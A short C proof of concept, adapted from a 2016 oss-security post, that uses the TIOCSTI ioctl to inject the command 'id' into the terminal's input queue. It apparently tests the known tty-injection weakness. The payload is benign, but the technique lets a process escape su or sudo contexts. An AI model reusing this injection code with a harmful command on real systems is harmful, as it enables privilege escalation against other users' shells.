/* -*- compile-command: "gcc -Wall -Werror -static tiocsti.c -o tiocsti" -*- */
/* adapted from http://www.openwall.com/lists/oss-security/2016/09/25/1 */
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>

int main()
{
    for (char *cmd = "id\n"; *cmd; cmd++)
    {
        if (ioctl(STDIN_FILENO, TIOCSTI, cmd))
        {
            fprintf(stderr, "++ ioctl failed: %m\n");
            return 1;
        }
    }
    return 0;
}
